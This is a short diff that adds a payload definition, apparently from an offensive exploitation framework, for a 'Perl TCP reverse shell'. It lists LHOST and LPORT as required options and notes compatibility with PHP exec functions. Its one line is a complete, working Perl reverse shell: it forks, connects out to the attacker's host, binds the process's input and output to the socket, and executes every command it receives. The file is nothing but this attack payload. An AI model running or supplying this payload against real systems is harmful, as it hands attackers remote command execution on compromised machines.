@@ -1,0 +1,5 @@
+title=Perl TCP reverse shell payload
+info=minimal shell without using &, compat with php exec functions
+required_opts=LHOST;LPORT
+connector=reverse_tcp_netcat
+payload=/usr/bin/env perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"LHOST:LPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
